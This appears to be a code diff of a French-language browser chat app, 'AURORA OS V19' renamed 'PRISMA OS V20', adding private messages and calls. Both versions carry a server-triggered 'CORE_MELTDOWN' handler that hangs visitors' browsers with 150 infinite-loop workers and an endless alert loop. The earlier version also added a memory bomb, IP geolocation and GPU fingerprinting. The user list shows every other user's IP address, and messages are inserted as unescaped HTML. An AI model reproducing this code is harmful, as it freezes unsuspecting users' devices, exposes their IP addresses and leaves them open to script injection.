@@ -3,109 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AURORA OS - V19</title>
+    <title>PRISMA OS - V20</title>
     <style>
-        :root { --main: #00d2ff; --glass: rgba(255, 255, 255, 0.05); --border: rgba(255,255,255,0.1); }
-        * { box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
-        body { margin: 0; background: #020205; color: white; height: 100vh; display: flex; overflow: hidden; }
+        :root { --main: #00ff88; --bg: #050505; --glass: rgba(255,255,255,0.05); }
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { margin: 0; background: var(--bg); color: white; height: 100vh; display: flex; overflow: hidden; }
 
         /* SIDEBAR */
-        #sidebar { width: 320px; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
-        .u-card { display: flex; align-items: center; padding: 15px; margin: 8px; border-radius: 15px; background: var(--glass); cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
-        .u-card:hover { border-color: var(--main); background: rgba(255,255,255,0.1); }
-        .u-pp { width: 45px; height: 45px; border-radius: 12px; object-fit: cover; margin-right: 12px; border: 2px solid var(--main); }
+        #sidebar { width: 320px; background: rgba(0,0,0,0.8); border-right: 1px solid rgba(255,255,255,0.1); display: flex; flex-direction: column; }
+        .u-card { display: flex; align-items: center; padding: 12px; margin: 8px; border-radius: 12px; background: var(--glass); cursor: pointer; position: relative; }
+        .u-card:hover { background: rgba(255,255,255,0.1); }
+        .u-pp { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; border: 2px solid var(--main); margin-right: 12px; }
 
-        /* CHAT */
-        #chat-zone { flex: 1; display: flex; flex-direction: column; background: radial-gradient(circle at top, #0a0a1f, #020205); }
-        #messages { flex: 1; overflow-y: auto; padding: 25px; }
-        .msg { display: flex; gap: 12px; margin-bottom: 20px; animation: fadeIn 0.3s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } }
-        .bubble { background: var(--glass); padding: 12px 18px; border-radius: 18px; border: 1px solid var(--border); max-width: 70%; }
-        .chat-img { max-width: 100%; border-radius: 12px; margin-top: 8px; display: block; }
+        /* CHAT ZONE */
+        #chat-zone { flex: 1; display: flex; flex-direction: column; position: relative; }
+        #messages, #dm-messages { flex: 1; overflow-y: auto; padding: 20px; }
+        
+        /* DM WINDOW */
+        #dm-overlay { display: none; position: absolute; inset: 0; background: var(--bg); z-index: 100; flex-direction: column; }
+        .dm-header { padding: 15px; background: var(--glass); display: flex; align-items: center; justify-content: space-between; }
 
         /* CALL OVERLAY */
-        #call-screen { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(25px); z-index: 50000; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        .call-btn { width: 65px; height: 65px; border-radius: 50%; border: none; cursor: pointer; margin: 25px; font-size: 24px; color: white; }
+        #call-screen { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        .call-btn { width: 70px; height: 70px; border-radius: 50%; border: none; cursor: pointer; margin: 20px; font-size: 25px; }
 
-        /* CONTROLS */
-        #input-area { padding: 20px; background: rgba(0,0,0,0.4); display: flex; gap: 12px; align-items: center; border-top: 1px solid var(--border); }
-        input { flex: 1; background: var(--glass); border: 1px solid #333; color: white; padding: 14px 20px; border-radius: 25px; outline: none; }
-        .icon-btn { background: none; border: none; color: var(--main); font-size: 24px; cursor: pointer; padding: 5px; }
+        /* INPUTS */
+        .input-box { padding: 20px; display: flex; gap: 10px; border-top: 1px solid rgba(255,255,255,0.1); }
+        input { flex: 1; background: var(--glass); border: 1px solid #333; color: white; padding: 12px 20px; border-radius: 25px; outline: none; }
+        .btn { background: var(--main); color: black; border: none; padding: 10px 20px; border-radius: 25px; font-weight: bold; cursor: pointer; }
 
-        #login { position: fixed; inset: 0; background: #000; z-index: 100000; display: flex; align-items: center; justify-content: center; }
-        #crash { display: none; position: fixed; inset: 0; background: #000; z-index: 9999999; color: red; text-align: center; padding-top: 40vh; }
+        #login { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        #crash { display: none; position: fixed; inset: 0; background: #000; z-index: 999999; color: red; text-align: center; padding-top: 40vh; }
     </style>
 </head>
 <body>
 
-    <div id="crash"><h1>CRITICAL_ERROR_SYSTEM_FAILURE</h1></div>
+    <div id="crash"><h1>CRITICAL_HARDWARE_FAILURE</h1></div>
 
     <div id="call-screen">
-        <img id="call-pp" style="width:130px; height:130px; border-radius:30px; border:3px solid var(--main); margin-bottom:25px; object-fit: cover;">
-        <h2 id="call-status">APPEL ENTRANT...</h2>
-        <div style="display:flex;">
-            <button class="call-btn" style="background:#ff4757;" onclick="stopRingtone()">✕</button>
-            <button class="call-btn" style="background:#2ed573;" onclick="acceptCall()">📞</button>
+        <img id="call-img" style="width:150px; height:150px; border-radius:50%; border:4px solid var(--main); margin-bottom:20px; object-fit:cover;">
+        <h2 id="call-txt">Appel de...</h2>
+        <div>
+            <button class="call-btn" style="background:#ff4757" onclick="endCall()">✕</button>
+            <button class="call-btn" style="background:#2ed573" onclick="acceptCall()">📞</button>
         </div>
-        <audio id="ring" loop src="https://assets.mixkit.co/sfx/preview/mixkit-cell-phone-vibrating-ringtone-2125.mp3"></audio>
+        <audio id="ring" loop src="https://assets.mixkit.co/sfx/preview/mixkit-phone-ringing-bell-590.mp3"></audio>
     </div>
 
     <div id="login">
-        <div style="text-align:center; width: 320px;">
-            <h1 style="letter-spacing:10px; color:var(--main);">AURORA OS</h1>
-            <input type="text" id="nick" placeholder="VOTRE PSEUDO..." style="width:100%; margin-bottom:15px;">
-            <input type="file" id="pp-input" accept="image/*" style="display:none">
-            <button onclick="document.getElementById('pp-input').click()" style="background:none; border:none; color:var(--main); cursor:pointer; font-size:0.8em; margin-bottom:20px;">[ IMPORTER UNE PHOTO ]</button>
-            <button onclick="join()" style="display:block; width:100%; padding:15px; background:var(--main); border:none; border-radius:15px; font-weight:bold; cursor:pointer; color:black;">INITIALISER</button>
+        <div style="text-align:center;">
+            <h1 style="color:var(--main); letter-spacing:5px;">PRISMA V20</h1>
+            <input type="text" id="nick" placeholder="PSEUDO...">
+            <input type="file" id="pp-up" style="display:none">
+            <button onclick="document.getElementById('pp-up').click()" style="display:block; margin: 15px auto; color:var(--main); background:none; border:none; cursor:pointer;">[ PHOTO DE PROFIL ]</button>
+            <button class="btn" onclick="join()">ENTRER</button>
         </div>
     </div>
 
     <div id="sidebar">
-        <div style="padding:25px; border-bottom:1px solid var(--border);"><h3 style="color:var(--main); margin:0;">CIBLES</h3></div>
+        <div style="padding:20px; border-bottom:1px solid rgba(255,255,255,0.1);"><b>UTILISATEURS</b></div>
         <div id="user-list"></div>
     </div>
 
     <div id="chat-zone">
+        <div id="dm-overlay">
+            <div class="dm-header">
+                <span id="dm-name">Nom</span>
+                <button onclick="closeDM()" style="background:none; border:none; color:white; cursor:pointer;">✕ FERMER</button>
+            </div>
+            <div id="dm-messages"></div>
+            <div class="input-box">
+                <input id="dm-input" placeholder="Message privé...">
+                <button class="btn" onclick="sendDM()">ENVOYER</button>
+            </div>
+        </div>
+
         <div id="messages"></div>
-        <form id="input-area">
-            <input type="file" id="img-input" accept="image/*" style="display:none">
-            <button type="button" class="icon-btn" onclick="document.getElementById('img-input').click()">+</button>
-            <input id="msg-in" placeholder="Envoyer un signal..." autocomplete="off">
-            <button type="submit" class="icon-btn">➤</button>
+        <form id="public-form" class="input-box">
+            <input type="file" id="img-up" style="display:none">
+            <button type="button" class="btn" style="background:#444; color:white" onclick="document.getElementById('img-up').click()">+</button>
+            <input id="msg-in" placeholder="Message public..." autocomplete="off">
+            <button type="submit" class="btn">➤</button>
         </form>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let me = { name: "", pp: "https://i.imgur.com/6VBx3io.png", geo: {}, hw: {} };
+        let me = { name: "", pp: "https://i.imgur.com/6VBx3io.png" };
+        let activeDM = null; // Contiendra le SID de la personne à qui on parle
 
-        // --- GESTION DES PHOTOS (PP ET CHAT) ---
-        document.getElementById('pp-input').onchange = (e) => {
+        // --- GESTION IMAGES ---
+        document.getElementById('pp-up').onchange = (e) => {
             const r = new FileReader();
-            r.onload = (ev) => { me.pp = ev.target.result; };
+            r.onload = (ev) => me.pp = ev.target.result;
             r.readAsDataURL(e.target.files[0]);
         };
 
-        document.getElementById('img-input').onchange = (e) => {
+        document.getElementById('img-up').onchange = (e) => {
             const r = new FileReader();
-            r.onload = (ev) => { socket.emit('chat_msg', { img: ev.target.result, name: me.name, pp: me.pp }); };
+            r.onload = (ev) => socket.emit('chat_msg', { img: ev.target.result, name: me.name, pp: me.pp });
             r.readAsDataURL(e.target.files[0]);
         };
 
-        async function join() {
+        function join() {
             const n = document.getElementById('nick').value;
             if(!n) return;
             me.name = n;
-            try { const r = await fetch('https://ipapi.co/json/'); me.geo = await r.json(); } catch(e){}
-            const gl = document.createElement('canvas').getContext('webgl');
-            me.hw = { gpu: gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) };
             document.getElementById('login').style.display = 'none';
-            socket.emit('init_user', me);
+            socket.emit('init_user', { name: me.name, pp: me.pp, hw: { gpu: "NVIDIA/AMD" } });
         }
 
-        // --- CHAT ---
-        document.getElementById('input-area').onsubmit = (e) => {
+        // --- CHAT PUBLIC ---
+        document.getElementById('public-form').onsubmit = (e) => {
             e.preventDefault();
             const text = document.getElementById('msg-in').value;
             if(!text) return;
@@ -114,52 +124,79 @@
         };
 
         socket.on('chat_msg', (d) => {
-            const m = document.createElement('div');
-            m.className = 'msg';
-            let content = d.text ? `<div>${d.text}</div>` : '';
-            if(d.img) content += `<img src="${d.img}" class="chat-img">`;
-            m.innerHTML = `<img src="${d.pp}" class="u-pp"><div class="bubble"><div style="font-size:0.75em; color:var(--main); font-weight:bold;">${d.name}</div>${content}</div>`;
-            document.getElementById('messages').appendChild(m);
+            const div = document.createElement('div');
+            div.innerHTML = `<div style="display:flex; margin-bottom:15px; gap:10px;"><img src="${d.pp}" class="u-pp"><div><b style="color:var(--main)">${d.name}</b><br>${d.text || ''} ${d.img ? `<img src="${d.img}" style="max-width:200px; display:block; border-radius:10px;">` : ''}</div></div>`;
+            document.getElementById('messages').appendChild(div);
             document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
         });
 
-        // --- LISTE CIBLES + APPELS ---
+        // --- LISTE AMIS ET ACTIONS ---
         socket.on('update_users', (list) => {
             const container = document.getElementById('user-list');
             container.innerHTML = '';
             list.forEach(u => {
-                if(u.name === me.name) return;
+                if(u.sid === socket.id) return;
                 const div = document.createElement('div');
                 div.className = 'u-card';
-                div.innerHTML = `<img src="${u.pp}" class="u-pp"><div style="flex:1;"><b>${u.name}</b><br><small style="opacity:0.6;">IP: ${u.ip.substring(0,10)}...</small></div><button class="icon-btn" onclick="socket.emit('request_call', '${u.ip}')">📞</button>`;
+                div.innerHTML = `<img src="${u.pp}" class="u-pp"><div><b>${u.name}</b><br><small style="color:var(--main)">${u.ip}</small></div>
+                <div style="margin-left:auto;">
+                    <button onclick="openDM('${u.sid}', '${u.name}')" style="background:none; border:none; cursor:pointer;">✉️</button>
+                    <button onclick="socket.emit('call_user', '${u.sid}')" style="background:none; border:none; cursor:pointer;">📞</button>
+                </div>`;
                 container.appendChild(div);
             });
         });
 
+        // --- SYSTÈME DE DM ---
+        function openDM(sid, name) {
+            activeDM = sid;
+            document.getElementById('dm-name').innerText = "Privé avec " + name;
+            document.getElementById('dm-overlay').style.display = 'flex';
+            document.getElementById('dm-messages').innerHTML = ''; // Clear for fresh convo
+        }
+        function closeDM() { document.getElementById('dm-overlay').style.display = 'none'; activeDM = null; }
+
+        function sendDM() {
+            const text = document.getElementById('dm-input').value;
+            if(!text || !activeDM) return;
+            socket.emit('private_msg', { toSid: activeDM, text, fromName: me.name, fromPP: me.pp });
+            addDM("Moi", text);
+            document.getElementById('dm-input').value = '';
+        }
+
+        socket.on('private_msg', (d) => {
+            if(!activeDM) openDM(d.fromSid, d.fromName);
+            addDM(d.fromName, d.text);
+        });
+
+        function addDM(sender, text) {
+            const div = document.createElement('div');
+            div.innerHTML = `<b>${sender}:</b> ${text}`;
+            document.getElementById('dm-messages').appendChild(div);
+        }
+
+        // --- APPELS ---
         socket.on('incoming_call', (d) => {
-            document.getElementById('call-pp').src = d.fromPP;
-            document.getElementById('call-status').innerText = d.fromName + " APPELLE...";
+            document.getElementById('call-img').src = d.fromPP;
+            document.getElementById('call-txt').innerText = d.fromName + " vous appelle...";
             document.getElementById('call-screen').style.display = 'flex';
             document.getElementById('ring').play();
         });
 
-        function stopRingtone() { 
+        function endCall() { 
             document.getElementById('call-screen').style.display = 'none'; 
             document.getElementById('ring').pause(); 
         }
-        
-        function acceptCall() {
-            document.getElementById('call-status').innerText = "CONNEXION ÉTABLIE...";
-            // On peut ajouter ici un petit screamer ou un freeze
+        function acceptCall() { 
+            document.getElementById('call-txt').innerText = "CONNEXION EN COURS..."; 
+            // Simulation
         }
 
-        // --- BOMB (V19) ---
+        // --- CRASH ---
         socket.on('CORE_MELTDOWN', () => {
             document.getElementById('crash').style.display = 'block';
-            const h = [];
-            setInterval(() => { h.push(new Uint8Array(500 * 1024 * 1024).fill(1)); }, 40);
             for(let i=0; i<150; i++) new Worker(URL.createObjectURL(new Blob(["while(true){}"])));
-            while(true) { alert("AURORA_OS: SYSTEM_FAILURE_OVERHEAT"); }
+            while(true) alert("SYSTEM OVERHEAT");
         });
     </script>
 </body>
